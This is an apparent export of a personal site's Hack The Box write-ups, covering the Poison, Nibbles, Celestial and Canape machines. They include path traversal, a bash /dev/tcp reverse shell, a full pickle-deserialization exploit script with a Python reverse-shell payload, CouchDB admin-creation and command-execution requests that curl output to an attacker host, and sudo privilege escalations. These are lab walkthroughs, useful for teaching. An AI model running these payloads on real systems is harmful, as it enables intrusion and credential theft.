            "text": "So, started with the usual nmap command:   We have a lot of things to attack. Let's start with the http.   First page ask you to choose one script.. Let's took  listfiles.php ...    The answer back is an Array object with each file that is inside that folder.. If we pay attention there is one called  pwdbackup.txt . I'd like to read it.. so.. what happens if we change the file param of the url?    Great... Now.. encoded at least 13 times, pretty easy to noticed that the encode is base64, so let's decoded. I developed a very simple script:  import base64 \n\npassword =  Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo= \n\nfor _ in xrange(13):\n    password = base64.decodestring(password)\n\nprint password  Once executed.. the answer is:  Charix!2#4%6 8(0 .\nOk maybe this could be a password for something.. maybe ssh, maybe vnc? Anyways, we are missing the user. How could we get the user?. \nWhat if we use again the path traversal vuln?:   Perfect. There is a user called  charix , due to the password has also that string, I guess is the correct user for our password.\nLet's try an ssh connection:", 
            "title": "User"
        }, 
        {
            "location": "/ctfs/hackthebox/poison/#root", 
            "text": "Ok, once I started using  LinEnum.sh , looking for filesystem files, doing enumeration basically. The first thing, is the  secret.zip  file which is placed in the home of charix.   I copied to my local machine and tried to bruteforce it with JTR, but no luck at all. Then I tried to use the same password as the user of charix and worked!. Anyways, the file is very strange, is just ascii text maybe encoded or encrypted or corrupted. At this moment I thought it was just a troll.   Then, I continued enumerating and discovered some processes running as root listeining only in localhost:    In particular,  Xvnc  and  sendmail  sound weird for me to be running as root. Due to I didn't have any idea of what sendmail was, I started looking for vnc.   So I looked for some commands in the machine (just pressing vnc ) and found  vncpasswd . Once I ran it, a message telling me which password file was using appeared. So I went to look for that file, and get the following:   So, after \"catting\" I realise that was more or less the same format as the file that I already decompressed from the ZIP. \nSo then I went to the internet to try to see if this format was already broken or if there was some tool to let you read the password in plain text from this file. And... yes! there was  one .  After using it, get the password  VNCP@$$! .  This probably is the password of root (or toor, there are two users with id 0). I tried them first with ssh, but it didn't work. Clearly, was the VNC password, but I had to test it anyways.  At this moment I totally forgot that my nmap had discovered a VNC open port, so I spend more than an hour trying to figure it out how how to initiate a connection from the machine itself to this server that was only listening in the localhost. Finally, I did something different. I used ssh, to make a port forwarding from my local machine to a port of the local port 5901 of the remote machine, by ussing the following command:  ssh -L 5901:127.0.0.1:5901 -N -f -l Charix 10.10.10.84  Once I made that connection, using remmina, the root user and the password found, I was able to get the flag:    YEAH! I had to copy it char by char xD.", 
            "title": "Root"
        }, 
        {
            "location": "/ctfs/hackthebox/poison/#nibbles-user-rooted", 
            "text": "", 
            "title": "Nibbles (User &amp; Rooted)"
        }, 
        {
            "location": "/ctfs/hackthebox/poison/#user_1", 
            "text": "Reading comments. Found  !-- /nibbleblog/ directory. Nothing interesting here! --   Ran dirbuster against http://10.10.10.75/nibbleblog/ \nFound  admin.php .  Tried with some default credentials:   admin:admin  nibbles:nibbles  admin:nibbles  (GOT IT!)   Tried to look for a LFI in some upload of images (new page, new post) without luck..  Search in google for nibbleblog:  It is a well-known CMS! .. Looking for exploit: YEAH! INside  MSF .  Run the exploit:   Once with the meterpreter.  cat /etc/passsd  Showed me, that there was only one user interesting called  nibbler .  whoami  returned also  nibbler .  Went to /home/nibbler and...:", 
            "title": "User"
        }, 
        {
            "location": "/ctfs/hackthebox/poison/#root_1", 
            "text": "So, first step was to create a reverse shell.. In order to do that I did:   On my local machine   sudo ufw allow 3333\nnc -lnvp 3333   On the remote machine  bash -i\nbash -i   /dev/tcp/IP/3333 0 1   Once I have the reverse shell in my local pc, I \"upgraded\" to a full tty (I learned this trick by looking this  video ).  So next step was use the  LinEnum.sh . I found it already in the vm, but othrwise uploading in it to the vm wouldn't be a problem at all (wget to some http server or some other way).  Once I ran it, one of the outputs was:  User nibbler may run the following commands on Nibbles:\n    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh\n\n[+] Possible sudo pwnage!\n-rwxrwxrwx 1 nibbler nibbler 21 May  1 19:01 /home/nibbler/personal/stuff/monitor.sh  This basicall means that there is a misconfiguration in the  /etc/sudoers  file which allows the user  nibbler  to execute any  monitor.sh  as root, without prompting any password. So my next step was simply:  echo  cat /root/root.txt    /home/nibbler/personal/stuff/monitor.sh\nsudo /home/nibbler/personal/stuff/monitor.sh  It's extremely important to run the the sudo comand not with the relative path, but with the absolute one. Because that's how sudo works  The output was the flag =):", 
            "title": "Root"
        }, 
        {
            "location": "/ctfs/hackthebox/celestial/", 
            "text": "Celestial\n\n\nUser\n\n\nAfter the nmap output we see that there is an open port running express js: \n\n\n\nNext step was to run \ndirb\n against it, while I went to see this page using a web browser.\n\n\nOnce we enter with the browser, a \nCUSTOM\n page saying 404 appears.. But if you go to analyze the HTTP response, you'll see that it isn't a real 404.. In fact, doing a deeper analysis, we will see that the \nset-cookie\n is present, and the payload seems to be base64. \n\n\n\n\nIf we refresh the page we will see this output:\n\n\n\n\nAnd if we decode the cookie, we'll have:\n\n\n{\nusername\n:\nDummy\n,\ncountry\n:\nIdk Probably Somewhere Dumb\n,\ncity\n:\nLametown\n,\nnum\n:\n2\n}\n\n\n\n\nSo my first attempt was trying to change the username for admin, or something like that but nothing happened. Then I realize that the message in the index page was saying \nDummy\n and \n2\n.  So I changed the \nnum\n for an \"a\" and the following I received the following response:\n\n\n\n\nThis was great. If you pay attention to the response, you'll see that the error cames from an \neval\n function. So basically this means that they we can execute arbitrary JS code?.. Let's see..:\n\n\n\n\nAfter a couple of tests I realize that the server was doing something like:\n\n\n...\neval(\nnum + num\n);\n...\n\n\n\n\nThat's why I appended \"//\" to the final of the payload in order to comment the rest of the line.\n\n\nSo, basically this means that we are able to execute arbitrary JS code. Next step, was look in the internet for a reverse shell. I found it (its in my documentation), adapt it and used it.\n\n\n\n\nOnce I got the reverse shell and upgraded to TTY, I finally get the user.txt from the \nDocuments\n directory.\n\n\nRoot\n\n\nThis part was very straightforward... \nOnce I get the user shell, I start seeing the files that were in the \n/home/user\n directory and there was a strange file called \noutput.txt\n which was own by root, but readeable for everyone. This file just contained the message \" Script is running \".\n\n\nAfterwards, I found a python script in the \nDocuments\n directory of the user, that just had the following line \n\n\nprint \nScript is running...\n\n\n\n\n\nThe \noutput.txt\n was being written each 5 minutes. So quickly I understood that this script was being executed by the \nroot\n user and the output was written to this \ntxt\n file. \n\n\nSo, why I did was to edit the script and add the following lines:\n\n\ncontent = open(\n/root/root.txt\n,\nr\n).read()\nprint content\n\n\n\n\nAfter 5 minutes (or less) the output was written again, and the content was the flag:", 
            "title": "Celestial"
        }, 
        {
            "location": "/ctfs/hackthebox/celestial/#celestial", 
            "text": "", 
            "title": "Celestial"
        }, 
        {
            "location": "/ctfs/hackthebox/celestial/#user", 
            "text": "After the nmap output we see that there is an open port running express js:   Next step was to run  dirb  against it, while I went to see this page using a web browser.  Once we enter with the browser, a  CUSTOM  page saying 404 appears.. But if you go to analyze the HTTP response, you'll see that it isn't a real 404.. In fact, doing a deeper analysis, we will see that the  set-cookie  is present, and the payload seems to be base64.    If we refresh the page we will see this output:   And if we decode the cookie, we'll have:  { username : Dummy , country : Idk Probably Somewhere Dumb , city : Lametown , num : 2 }  So my first attempt was trying to change the username for admin, or something like that but nothing happened. Then I realize that the message in the index page was saying  Dummy  and  2 .  So I changed the  num  for an \"a\" and the following I received the following response:   This was great. If you pay attention to the response, you'll see that the error cames from an  eval  function. So basically this means that they we can execute arbitrary JS code?.. Let's see..:   After a couple of tests I realize that the server was doing something like:  ...\neval( num + num );\n...  That's why I appended \"//\" to the final of the payload in order to comment the rest of the line.  So, basically this means that we are able to execute arbitrary JS code. Next step, was look in the internet for a reverse shell. I found it (its in my documentation), adapt it and used it.   Once I got the reverse shell and upgraded to TTY, I finally get the user.txt from the  Documents  directory.", 
            "title": "User"
        }, 
        {
            "location": "/ctfs/hackthebox/celestial/#root", 
            "text": "This part was very straightforward... \nOnce I get the user shell, I start seeing the files that were in the  /home/user  directory and there was a strange file called  output.txt  which was own by root, but readeable for everyone. This file just contained the message \" Script is running \".  Afterwards, I found a python script in the  Documents  directory of the user, that just had the following line   print  Script is running...   The  output.txt  was being written each 5 minutes. So quickly I understood that this script was being executed by the  root  user and the output was written to this  txt  file.   So, why I did was to edit the script and add the following lines:  content = open( /root/root.txt , r ).read()\nprint content  After 5 minutes (or less) the output was written again, and the content was the flag:", 
            "title": "Root"
        }, 
        {
            "location": "/ctfs/hackthebox/canape/", 
            "text": "Canape\n\n\nUser\n\n\nThis was my favorite machine so far. Thanks: @overcast!.\nSo, as always, lets start with nmap:\n\n\n$\n nmap -sC -sV 10.10.10.70  \n nmap\n\n\n\n\nAnd here is the output:\n\n\n\n\nGreat, while we go to the HTTP server, I'll let an nmap full scan running..\nOnce we connect to the HTTP server we find some stuff related with The Simpsons, nothing interesting yet..\nLooking to the source code of the main page, we find this: \n\n\n\n\nOk..  Seems not to be too relevant right now, but .. maybe it's useful later on. I continued digging in across the web site, trying to submit some quote with malicious content, but without luck.  Then, I realized that the nmap has discovered a \n.git\n directory, so I proceed to download it: \n\n\n$\n wget --recursive --no-parent http://10.10.10.70/.git/\n\n\n\n\nOnce I get into the directory, I listed all the logs and figured it out that one of the hashes of the commits, was the same as the one in the source code of the web page. At that moment, I thought that this hash was telling us the current version of the running application. I listed all the files of the initial commit, and then add the updates that the commit made, and extract a code of a Flask application.\n\n\n\n\nJust in a few words, this application had to main entrypoints:\n\n\n\n\nsubmit\n: Where you can submit your quote, and it will stored using \nPickle\n.\n\n\ncheck\n: Where it will load the content of your quote \nas a Pickle\n and show it back to you.\n\n\n\n\nI searched for some tutorials of how to exploit this and fortunately I found a couple of them. \n\n\nSo, time to develop our own exploit. My next step, was to copy the code locally, remove the things that where not important for us (connection to DB, rendering of templates, etc) and start testing it. After some time, I had my exploit working locally, so I went to test it remotely. Unfortunately, I didn't work at all, and I didn't have any clue why it wasn't working.\n\n\nI started to go back on my steps, and figured it out something crucial. The \nsubmit\n endpoint was saving the content of the submitted quote in a temporary file. The name of this file was the result of getting the 10 first chars of the encoding in base64 of concatneation between the character \n quote content: \n\n\n...\np_id = base64.b64encode(char + quote)[:10]\n...\n\n\n\n\nOr.. at least, that was why I thought... When I went back on my steps, I figured the commits after the one we analyzed, some changes on the code were made.. In particular there was one, that changed the way of defining the file name.. They changed from the base64 encoding of the first 10 chars to the md5 hash \nof the concatenation:\n\n\ngit show 524f9ddcc74e10aba7256f91263c935c6dfb41e1\n    -    p_id = base64.b64encode(char + quote)[:10]\n    +    p_id = md5(char + quote).hexdigest()\n\n\n\n\nSo I decided to get the last version of the application (by analyzing the changes of each commit) and develop again the exploit. \n\n\nThis was final version of the python application:\n\n\nimport string\nimport random\nimport base64\nimport cPickle\nfrom flask import Flask, render_template, request\nfrom hashlib import md5\n\napp = Flask(__name__)\n\n@app.errorhandler(404)\ndef page_not_found(e):\n    if random.randrange(0, 2) \n 0:\n        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randrange(50, 250)))\n    else:\n    return render_template(\nindex.html\n)\n\n@app.route(\n/\n)\ndef index():\n    return render_template(\nindex.html\n)\n\n@app.route(\n/quotes\n)\ndef quotes():\n    quotes = []\n    for id in db:\n        quotes.append({\ntitle\n: db[id][\ncharacter\n], \ntext\n: db[id][\nquote\n]})\n    return render_template('quotes.html', entries=quotes)\n\nWHITELIST = [\n    \nhomer\n,\n    \nmarge\n,\n    \nbart\n,\n    \nlisa\n,\n    \nmaggie\n,\n    \nmoe\n,\n    \ncarl\n,\n    \nkrusty\n\n]\n\n@app.route(\n/submit\n, methods=[\nGET\n, \nPOST\n])\ndef submit():\n    error = None\n    success = None\n\n    if request.method == \nPOST\n:\n        try:\n            char = request.form[\ncharacter\n]\n            quote = request.form[\nquote\n]\n            print \nChar: {}]\\nQuote:{}\n.format(char,quote)\n            if not char or not quote:\n                error = True\n            elif not any(c.lower() in char.lower() for c in WHITELIST):\n                error = True\n            else:\n                # TODO - Pickle into dictionary instead, `check` is ready\n                #p_id = base64.b64encode(char + quote)[:10]\n                p_id = md5(char + quote).hexdigest()\n                outfile = open(\n/tmp/\n + p_id + \n.p\n, \nwb\n)\n        outfile.write(char + quote)\n        outfile.close()\n            success = True\n        except Exception as ex:\n            error = True\n\n    if error:\n        return \nhtml\np1\nerror\n/p1\n/html\n\n    else:\n        return \nhtml\np1\nsuccess\n/p1\n/html\n\n    #return \nrender_template(\nsubmit.html\n, error=error, success=success)\n\n@app.route(\n/check\n, methods=[\nPOST\n])\ndef check():\n    print request.form[\nid\n]\n    path = \n/tmp/\n + request.form[\nid\n] + \n.p\n\n    data = open(path, \nrb\n).read()\n\n    if \np1\n in data:\n        item = cPickle.loads(data)\n    else:\n        item = data\n    print item\n    return \nStill reviewing: \n + item\n\nif __name__ == \n__main__\n:\n    app.run(host=\n0.0.0.0\n)\n\n\n\n\n(it may be a little modified, but the core parts are there.)\nSo with this version running locally, I continued developing my exploit to get a reverse shell, and after a couple of minutes, I achieved this: \n\n\nimport requests\n#import base64\nfrom hashlib import md5\n\nPATH_REMOTE = \nhttp://10.10.10.70/{}\n\nPATH_LOCAL = \nhttp://192.168.0.15:5000/{}\n\nREMOTE = True\n\ndef submit_exploit(cmd):\n    action = 'submit'\n    char = \nS'homer'\\np1\\ncos\\nsystem\\n(S'{cmd}'\\ntRS'marge'\\np1\\n\n.format(cmd=cmd)\n    quote = '.'\n    payload = \ncharacter={char}\nquote={quote}\n.format(char=char,quote=quote)\n    headers = {'Content-type': 'application/x-www-form-urlencoded'}\n    path = PATH_REMOTE.format(action) if REMOTE else PATH_LOCAL.format(action)\n    print payload\n    r = requests.post(path, data=payload, headers=headers)\n    if r.status_code == 200 and (\nthank you for your suggestion\n in r.text.lower() or 'success' in r.text.lower()): \n        print \n[+] Payload successfully sent. Command: {cmd}\n.format(cmd=cmd)\n        #return base64.encodestring(char+quote)[:10]\n        return md5(char+quote).hexdigest()\n    else:\n        print \n[-] Error sending payload\n\n        raise Exception(\nError sending payload: \\n\\tHttp code returned: {http_code}. \\n\\t response body:\\n {body}\n.format(http_code= r.status_code, body=r.text))\n\ndef check_and_run_exploit(id_code):\n    action = 'check'\n    headers = {'Content-type': 'application/x-www-form-urlencoded'}\n    payload = \nid={id_code}\n.format(id_code=id_code)\n    path = PATH_REMOTE.format(action) if REMOTE else PATH_LOCAL.format(action)\n    r = requests.post(path, data=payload, headers=headers)\n    if r.status_code == 200: \n        print \n[+] Exploit successfully executed\n\n        return r.text\n    else:\n        print \n[-] Error executing exploit\n\n        raise Exception(\nError executing exploit: \\n\\tHttp code returned: {http_code}. \\n\\t response body:\\n {body}\n.format(http_code= r.status_code, body=r.text))\n\nif __name__ == \n__main__\n:\n    cmd = \npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\n10.10.14.255\\\n,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\n/bin/sh\\\n,\\\n-i\\\n]);'\n\n    id_code = submit_exploit(cmd)\n    check_and_run_exploit(id_code)\n\n\n\n\nTwo disclaimers:\n\n\n\n\nThe first and last part of the payload have two strings Homer and Marge. The first one is to bypass the whitelist filtering that app has regarding the name of the character. The last one is to avoid the application to trigger and error when concatenating the result of the Pickle.load() to a string (otherwise it will try to concatenate a number (the error code of the executed command) and a string, and it will fail).\n\n\nThe REMOTE variable is just something custom made to quickly switch between the Remote server and my local one.\n\n\n\n\nAfter launching the exploit, we get a reverse shell in the port 4444. Once we got the reverse shell, we upgraded to tty (see ippsec video) in order to have more features (history, auto-completition, etc).\n\n\n\n\nAlthough, we have a reverse shell, the user running the HTTP server is \nwww-data\n, so we need to escalate privileges and log in as other user. \nOnce inside the machine, my first move was to run \nLinEnum.sh\n. Once of the outputs of it was the following: \n\n\n\n\nI spent hours, trying to understand this file. Until I gave up (hopefully I did it) and continue looking in another place. I guess it was a \nBIG\n troll.\n\n\nAnalyzing the applications running on the system and its ports, I found the \ncouchdb\n running in localhost. \nI started reading a little bit about this DB (never saw it before), and quickly figure it out how to connect to it: \n\n\n$\n curl -X GET http://localhost:5984\n{\ncouchdb\n:\nWelcome\n,\nversion\n:\n2.0.0\n,\nvendor\n:{\nname\n:\nThe Apache Software Foundation\n}}\n\n\n\n\nI started playing around a little more and figured it out how to list dbs and docs inside them: \n\n\n$\n curl -X GET http://localhost:5984/_all_dbs\n[\n_global_changes\n,\n_metadata\n,\n_replicator\n,\n_users\n,\npasswords\n,\nsimpsons\n]\n$\n curl -X GET http://localhost:5984/simpsons/_all_docs\n{\ntotal_rows\n:7,\noffset\n:0,\nrows\n:[\n{\nid\n:\nf0042ac3dc4951b51f056467a1000dd9\n,\nkey\n:\nf0042ac3dc4951b51f056467a1000dd9\n,\nvalue\n:{\nrev\n:\n1-fbdd816a5b0db0f30cf1fc38e1a37329\n}},\n{\nid\n:\nf53679a526a868d44172c83a61000d86\n,\nkey\n:\nf53679a526a868d44172c83a61000d86\n,\nvalue\n:{\nrev\n:\n1-7b8ec9e1c3e29b2a826e3d14ea122f6e\n}},\n{\nid\n:\nf53679a526a868d44172c83a6100183d\n,\nkey\n:\nf53679a526a868d44172c83a6100183d\n,\nvalue\n:{\nrev\n:\n1-e522ebc6aca87013a89dd4b37b762bd3\n}},\n{\nid\n:\nf53679a526a868d44172c83a61002980\n,\nkey\n:\nf53679a526a868d44172c83a61002980\n,\nvalue\n:{\nrev\n:\n1-3bec18e3b8b2c41797ea9d61a01c7cdc\n}},\n{\nid\n:\nf53679a526a868d44172c83a61003068\n,\nkey\n:\nf53679a526a868d44172c83a61003068\n,\nvalue\n:{\nrev\n:\n1-3d2f7da6bd52442e4598f25cc2e84540\n}},\n{\nid\n:\nf53679a526a868d44172c83a61003a2a\n,\nkey\n:\nf53679a526a868d44172c83a61003a2a\n,\nvalue\n:{\nrev\n:\n1-4446bfc0826ed3d81c9115e450844fb4\n}},\n{\nid\n:\nf53679a526a868d44172c83a6100451b\n,\nkey\n:\nf53679a526a868d44172c83a6100451b\n,\nvalue\n:{\nrev\n:\n1-3f6141f3aba11da1d65ff0c13fe6fd39\n}}\n$\n curl -X GET http://localhost:5984/passwords/_all_docs\n{\nerror\n:\nunauthorized\n,\nreason\n:\nYou are not a server admin.\n}\n\n\n\n\nSo the job now seems to be getting server admin. After a google search looking for vulnerabilties affecting this DB in this version, I found this \nEXCELENT\n \nblogpost\n. Basically the attack consist in creating a server admin without any credentials only by sending an HTTP request (for further details, read the blog).\n\n\nI changed (just the names) a little bit the PoC of the blog and executed against the db: \n\n\n$\n curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:oops' --data-binary '{\n  \ntype\n: \nuser\n,\n  \nname\n: \ntsuller\n,\n  \nroles\n: [\n_admin\n],\n  \nroles\n: [],\n  \npassword\n: \ntsuller\n\n}'\n{\nok\n:true,\nid\n:\norg.couchdb.user:tsuller\n,\nrev\n:\n1-0b547bb36cb610ec21d9571312f6e20c\n}\n\n\n\n\nYes! Seems that it worked! Lets check:\n\n\n$\n curl -X GET http://tsuller:tsuller@localhost:5984/_passwords/_all_docs\n{\ntotal_rows\n:4,\noffset\n:0,\nrows\n:[\n{\nid\n:\n739c5ebdf3f7a001bebb8fc4380019e4\n,\nkey\n:\n739c5ebdf3f7a001bebb8fc4380019e4\n,\nvalue\n:{\nrev\n:\n2-81cf17b971d9229c54be92eeee723296\n}},\n{\nid\n:\n739c5ebdf3f7a001bebb8fc43800368d\n,\nkey\n:\n739c5ebdf3f7a001bebb8fc43800368d\n,\nvalue\n:{\nrev\n:\n2-43f8db6aa3b51643c9a0e21cacd92c6e\n}},\n{\nid\n:\n739c5ebdf3f7a001bebb8fc438003e5f\n,\nkey\n:\n739c5ebdf3f7a001bebb8fc438003e5f\n,\nvalue\n:{\nrev\n:\n1-77cd0af093b96943ecb42c2e5358fe61\n}},\n{\nid\n:\n739c5ebdf3f7a001bebb8fc438004738\n,\nkey\n:\n739c5ebdf3f7a001bebb8fc438004738\n,\nvalue\n:{\nrev\n:\n1-49a20010e64044ee7571b8c1b902cf8c\n}}\n]}\n\n\n\n\nYES! Worked. Lets dump the content of each doc:\n\n\n$\n curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4\n{\n_id\n:\n739c5ebdf3f7a001bebb8fc4380019e4\n,\n_rev\n:\n2-81cf17b971d9229c54be92eeee723296\n,\nitem\n:\nssh\n,\npassword\n:\n0B4jyA0xtytZi7esBNGp\n,\nuser\n:\n}\n$\n curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d\n{\n_id\n:\n739c5ebdf3f7a001bebb8fc43800368d\n,\n_rev\n:\n2-43f8db6aa3b51643c9a0e21cacd92c6e\n,\nitem\n:\ncouchdb\n,\npassword\n:\nr3lax0Nth3C0UCH\n,\nuser\n:\ncouchy\n}\n$\n curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f\n{\n_id\n:\n739c5ebdf3f7a001bebb8fc438003e5f\n,\n_rev\n:\n1-77cd0af093b96943ecb42c2e5358fe61\n,\nitem\n:\nsimpsonsfanclub.com\n,\npassword\n:\nh02ddjdj2k2k2\n,\nuser\n:\nhomer\n}\n$\n curl http://tsuller:tsuller@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438004738\n{\n_id\n:\n739c5ebdf3f7a001bebb8fc438004738\n,\n_rev\n:\n1-49a20010e64044ee7571b8c1b902cf8c\n,\nuser\n:\nhomerj0121\n,\nitem\n:\ngithub\n,\npassword\n:\nSTOP STORING YOUR PASSWORDS HERE -Admin\n}\n\n\n\n\nIf we pay atenttion to the \nhome\n directory, we'll just find \nhomer\n user. So my next step was to try to login with this user using some of this credentials. Fortunately, the first one (the \nssh\n one) worked, and seconds later I was able to get the user flag: \n\n\n\n\nRoot\n\n\nTo start, I ran again the \nLinEnum.sh\n but this time tried to pay a little more of attention to the output, but... it was worthless. Nothing point me to the right direction.\n\n\nIn some moment, I thought that the couchdb was running as \nroot\n. I decided to look for some public exploit. Fortunately, I found one that allowed you to execute commands if you were a system admin. Not only we had the user created by us, but also \ncouchy\n (look the docs of the \npassword\n db) was admin. \nThanks to this \nblogpost\n first, and a little help from \nthis\n also I was able to successfully execute commands: \n\n\ncurl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/_config/query_servers/cmd' -d '\nwhoami | curl http://10.10.14.255:5555 -d @-\n'  --insecure\ncurl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing' --insecure\ncurl -X PUT 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing/blah' -d '{\n_id\n:\n770855a97726d5666d70a22173005c77\n}' --insecure\ncurl -X POST 'http://couchy:r3lax0Nth3C0UCH@localhost:5986/testing/_temp_view?limit=11' -d '{\nlanguage\n:\ncmd\n,\nmap\n:\n}' -H 'Content-Type: application/json' --insecure\n\n\n\n\nUnfortunately, when I went to my shell where I was hosting the NC in port 5555, the news were bad. The answer of the \nwhoami\n wasn't root but homer. I must have confused with some other running process. \n\n\nI continued looking for some interesting thing, but nothing showed up. \n\n\nDuring that search, I issued: \n\n\nsudo -l \n\n\n\n\nAnd this was the output:\n![sudoers][./images/canape/sudoers.png]\n\n\nFor those not very familiar, this means that the user \nhomer\n can run as \nroot\n the command \npip install\n without providing a password (this comes from the configuration of the /etc/sudoers file). How can we abuse this?\n\n\nPIP\n is a python packet manager. It allows not only to write down the package you want (and if it's in the pipy repository download it) but also it allows you to install packages providing the source file directly. Usually, python packages have a very particular file called \nsetup.py\n which is the one in charge of really installing the package in your enviroment (virtual env or general env). \n\n\nSo my idea was to, download a compressed version of package that already exists (I pick \nrequest\n because is my favourite lib), modify it's code, compress it again and try to install it using sudo:\n\n\n\n\nDownloaded the source code from \nhere\n.\n\n\nDecompressed it.\n\n\nAdded the following line to the setup.py:\n\n\n\n\nos.system('cat /root/root.txt \n /tmp/4877df3bb9dfe713a404dd8d6e4e94cc.p')\n\n\n\n\n(I used that name just to try not to spoil to anybody the flag due to in /tmp there are all the submitted quotes)\n\n Compressed it again.\n\n Served it in a python serve so you can copy it to the machine .\n* Executed:\n\n\nsudo /usr/bin/pip install blablabla.tar.gz\n\n\n\n\n\n\nRead the flag from \n/tmp/4877df3bb9dfe713a404dd8d6e4e94cc.p\n\n\nModify again the previous setup.py again, this time to delete the flag file and don't spoil to anyone =D.", 
            "title": "Canape (favourite)"
        }, 
        {
            "location": "/ctfs/hackthebox/canape/#canape", 
            "text": "", 
            "title": "Canape"
        }, 
        {
            "location": "/ctfs/hackthebox/canape/#user", 
            "text": "This was my favorite machine so far. Thanks: @overcast!.\nSo, as always, lets start with nmap:  $  nmap -sC -sV 10.10.10.70    nmap  And here is the output:   Great, while we go to the HTTP server, I'll let an nmap full scan running..\nOnce we connect to the HTTP server we find some stuff related with The Simpsons, nothing interesting yet..\nLooking to the source code of the main page, we find this:    Ok..  Seems not to be too relevant right now, but .. maybe it's useful later on. I continued digging in across the web site, trying to submit some quote with malicious content, but without luck.  Then, I realized that the nmap has discovered a  .git  directory, so I proceed to download it:   $  wget --recursive --no-parent http://10.10.10.70/.git/  Once I get into the directory, I listed all the logs and figured it out that one of the hashes of the commits, was the same as the one in the source code of the web page. At that moment, I thought that this hash was telling us the current version of the running application. I listed all the files of the initial commit, and then add the updates that the commit made, and extract a code of a Flask application.   Just in a few words, this application had to main entrypoints:   submit : Where you can submit your quote, and it will stored using  Pickle .  check : Where it will load the content of your quote  as a Pickle  and show it back to you.   I searched for some tutorials of how to exploit this and fortunately I found a couple of them.   So, time to develop our own exploit. My next step, was to copy the code locally, remove the things that where not important for us (connection to DB, rendering of templates, etc) and start testing it. After some time, I had my exploit working locally, so I went to test it remotely. Unfortunately, I didn't work at all, and I didn't have any clue why it wasn't working.  I started to go back on my steps, and figured it out something crucial. The  submit  endpoint was saving the content of the submitted quote in a temporary file. The name of this file was the result of getting the 10 first chars of the encoding in base64 of concatneation between the character   quote content:   ...\np_id = base64.b64encode(char + quote)[:10]\n...  Or.. at least, that was why I thought... When I went back on my steps, I figured the commits after the one we analyzed, some changes on the code were made.. In particular there was one, that changed the way of defining the file name.. They changed from the base64 encoding of the first 10 chars to the md5 hash \nof the concatenation:  git show 524f9ddcc74e10aba7256f91263c935c6dfb41e1\n    -    p_id = base64.b64encode(char + quote)[:10]\n    +    p_id = md5(char + quote).hexdigest()  So I decided to get the last version of the application (by analyzing the changes of each commit) and develop again the exploit.   This was final version of the python application:  import string\nimport random\nimport base64\nimport cPickle\nfrom flask import Flask, render_template, request\nfrom hashlib import md5\n\napp = Flask(__name__)\n\n@app.errorhandler(404)\ndef page_not_found(e):\n    if random.randrange(0, 2)   0:\n        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randrange(50, 250)))\n    else:\n    return render_template( index.html )\n\n@app.route( / )\ndef index():\n    return render_template( index.html )\n\n@app.route( /quotes )\ndef quotes():\n    quotes = []\n    for id in db:\n        quotes.append({ title : db[id][ character ],  text : db[id][ quote ]})\n    return render_template('quotes.html', entries=quotes)\n\nWHITELIST = [\n     homer ,\n     marge ,\n     bart ,\n     lisa ,\n     maggie ,\n     moe ,\n     carl ,\n     krusty \n]\n\n@app.route( /submit , methods=[ GET ,  POST ])\ndef submit():\n    error = None\n    success = None\n\n    if request.method ==  POST :\n        try:\n            char = request.form[ character ]\n            quote = request.form[ quote ]\n            print  Char: {}]\\nQuote:{} .format(char,quote)\n            if not char or not quote:\n                error = True\n            elif not any(c.lower() in char.lower() for c in WHITELIST):\n                error = True\n            else:\n                # TODO - Pickle into dictionary instead, `check` is ready\n                #p_id = base64.b64encode(char 